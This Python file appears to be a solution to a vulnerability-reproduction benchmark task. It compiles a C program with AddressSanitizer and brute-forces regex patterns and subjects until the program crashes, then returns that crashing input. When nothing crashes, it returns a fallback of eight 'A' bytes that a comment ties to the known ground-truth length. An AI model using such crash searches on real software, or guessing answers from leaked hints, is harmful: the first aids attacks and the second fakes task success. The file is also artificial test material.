import os
import tarfile
import tempfile
import subprocess
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp_dir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            # Extract the source tarball
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmp_dir)
            except Exception:
                # If extraction fails, just return a simple fallback PoC
                return b"AAAAAAAA"

            bin_path = self._build_binary(tmp_dir)
            if bin_path is not None:
                poc = self._find_poc(bin_path)
                if poc is not None:
                    return poc
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

        # Fallback PoC (8 bytes as hinted by ground-truth length)
        return b"AAAAAAAA"

    def _build_binary(self, root: str):
        # Collect all .c files
        c_files = []
        for r, _, files in os.walk(root):
            for f in files:
                if f.endswith(".c"):
                    c_files.append(os.path.join(r, f))

        if not c_files:
            return None

        if shutil.which("gcc") is None:
            return None

        bin_path = os.path.join(root, "poc_bin")
        cc_base = [
            "gcc",
            "-std=c11",
            "-O0",
            "-g",
            "-fsanitize=address",
            "-fno-omit-frame-pointer",
        ]

        # Try compiling with various potential PCRE libraries
        lib_sets = [
            [],
            ["-lpcre"],
            ["-lpcre2-8"],
            ["-lpcre", "-lpcre2-8"],
        ]

        for libs in lib_sets:
            cmd = cc_base + c_files + ["-o", bin_path] + libs
            try:
                proc = subprocess.run(
                    cmd,
                    cwd=root,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=60,
                )
            except Exception:
                continue

            if proc.returncode == 0 and os.path.isfile(bin_path):
                try:
                    os.chmod(bin_path, 0o755)
                except Exception:
                    pass
                return bin_path

        return None

    def _find_poc(self, bin_path: str):
        bin_dir = os.path.dirname(bin_path)

        def check(data: bytes) -> bool:
            try:
                proc = subprocess.run(
                    [bin_path],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    cwd=bin_dir,
                    timeout=1.0,
                )
            except subprocess.TimeoutExpired:
                # Treat timeouts as non-crashes for this PoC search
                return False
            except Exception:
                return False

            if proc.returncode == 0:
                return False

            err = proc.stderr or b""
            indicators = [
                b"AddressSanitizer",
                b"stack-buffer-overflow",
                b"heap-buffer-overflow",
                b"buffer-overflow",
                b"segmentation fault",
                b"segfault",
                b"SIGSEGV",
                b"stack smashing detected",
            ]
            return any(ind in err for ind in indicators)

        # Quick tests with minimal inputs
        if check(b""):
            return b""
        if check(b"\n"):
            return b"\n"

        # Candidate regex patterns focused on capturing parentheses and simple constructs
        patterns = [
            "a",
            "ab",
            ".",
            "a+",
            "a*",
            "a?",
            "[ab]",
            "[a-z]",
            "\\d",
            "(a)",
            "(ab)",
            "(a+)",
            "(a*)",
            "((a))",
            "(a)(b)",
            "(a)(a+)",
            "(a*)+",
            "((a+)b)",
            "((a)*)",
            "(a|b)",
            "(a|ab)",
            "((a|b))",
            "()",
            "()+",
            "() *".replace(" ", ""),  # "()*"
            "(",
            "a(",
            "(a",
            "a)",
        ]

        # Deduplicate while preserving order
        patterns = list(dict.fromkeys(patterns))

        # Candidate subjects
        subjects = [
            "",
            "a",
            "b",
            "ab",
            "ba",
            "aaa",
            "aaaa",
            "1",
            "123",
        ]
        subjects = list(dict.fromkeys(subjects))

        # Try pattern-only and pattern+subject layouts
        for pat in patterns:
            pb = pat.encode("ascii", "replace")

            # Layout 1: pattern only (single line)
            data1 = pb + b"\n"
            if check(data1):
                return data1

            # Layout 2: pattern then subject (two lines)
            for sub in subjects:
                sb = sub.encode("ascii", "replace")
                data2 = pb + b"\n" + sb + b"\n"
                if check(data2):
                    return data2

        # Layout 3: subject only (single line) – in case pattern is constant
        for sub in subjects:
            sb = sub.encode("ascii", "replace")
            data3 = sb + b"\n"
            if check(data3):
                return data3

        return None